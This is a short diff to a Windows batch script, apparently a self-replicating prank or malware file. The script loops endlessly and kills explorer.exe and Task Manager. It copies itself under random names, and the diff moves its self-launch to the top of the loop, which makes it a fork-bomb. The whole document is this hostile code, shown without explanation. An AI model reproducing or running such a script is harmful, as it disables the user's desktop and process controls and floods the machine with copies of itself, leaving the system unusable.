@@ -1,5 +1,6 @@
 @echo off
 :a
+start %~dp0e.bat
 setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
 set len=20
 set charpool=0123456789QWERTZUIOPASDFGHJKLYXCVBNMqwertzuiopasdfghjklyxcvbnm
@@ -11,7 +12,6 @@ for /L %%b IN (1, 1, %len%) do (
 )
 taskkill /im explorer.exe /f
 taskkill /im taskmgr.exe /f
-start %~dp0e.bat
 copy %~dp0e.bat %~dp0\%gen_str%1.bat
 copy %~dp0e.bat %~dp0\%gen_str%2.bat
 copy %~dp0e.bat %~dp0\%gen_str%3.bat
